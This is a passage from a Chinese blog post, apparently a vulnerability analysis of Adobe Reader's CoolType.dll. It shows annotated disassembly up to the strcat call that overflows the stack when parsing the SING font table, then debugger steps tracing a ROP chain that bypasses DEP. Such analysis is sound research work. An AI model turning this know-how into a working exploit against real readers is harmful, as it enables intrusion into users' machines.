SING表的入口处的值</span><br><span class="line">.text:0803DD85                 cmp     eax, esi        ; 判断是否为NULL</span><br><span class="line">.text:0803DD87                 mov     byte ptr [ebp+108h+var_10C], 2</span><br><span class="line">.text:0803DD8B                 jz      short loc_803DDC4 ; 为空则跳转</span><br><span class="line">.text:0803DD8D                 mov     ecx, [eax] ;字体版本资源号，这里是1.0版本，即00 10 00 00</span><br><span class="line">.text:0803DD8F                 and     ecx, 0FFFFh</span><br><span class="line">.text:0803DD95                 jz      short loc_803DD9F ; 发生跳转</span><br><span class="line">.text:0803DD97                 cmp     ecx, 100h</span><br><span class="line">.text:0803DD9D                 jnz     short loc_803DDC0</span><br><span class="line">.text:0803DD9F</span><br><span class="line">.text:0803DD9F loc_803DD9F:                            ; CODE XREF: sub_803DCF9+9Cj</span><br><span class="line">.text:0803DD9F                 add     eax, 10h</span><br><span class="line">.text:0803DDA2                 push    eax             ; char *src</span><br><span class="line">.text:0803DDA3                 lea     eax, [ebp+108h+var_108]</span><br><span class="line">.text:0803DDA6                 push    eax             ; char *dest</span><br><span class="line">.text:0803DDA7                 mov     [ebp+108h+var_108], 0</span><br><span class="line">.text:0803DDAB                 call    strcat          ; 造成溢出</span><br></pre></td></tr></table></figure><h2 id="4-动态分析"><a href="#4-动态分析" class="headerlink" title="4.动态分析"></a>4.动态分析</h2><p>使用Olldbg attach到Adobe Reader进程，寻找CoolType.dll中的位置在下图所示位置：</p><p><img src="OD1.png" alt=""></p><p>注意这里，之前断点一直没有触发，在网上找了好久，才找到如下解决方法：</p><p><img src="OD2.png" alt=""></p><p>打开样本触发断点：</p><p><img src="OD4.png" alt=""></p><p>继续执行，到造成溢出处断下，数据拷贝方向如下：</p><p><img src="OD5.png" alt=""></p><p>f8执行，栈空间已被覆盖：</p><p><img src="OD6.png" alt=""></p><p>参考漏洞战争，在这下个断点：</p><p><img src="OD7.png" alt=""></p><p>f7单步步入，在此处返回，ROP指令1：</p><p><img src="OD8.png" alt=""></p><p>ROP指令2：</p><p><img src="ROP1.png" alt=""></p><p>ROP指令3：</p><p><img src="ROP2.png" alt=""></p><p>ROP指令4：</p><p><img src="ROP4.png" alt=""></p><p>通过分析栈空间内容，可以分析处样本通过ROP技术调用了CreateFileA();</p><p>CreateFileMapping();</p><p>MapViewOfFile();</p><p>memcpy()</p><p>等一系列函数来绕过DEP保护。</p><p><img src="Createfile.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 技术分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
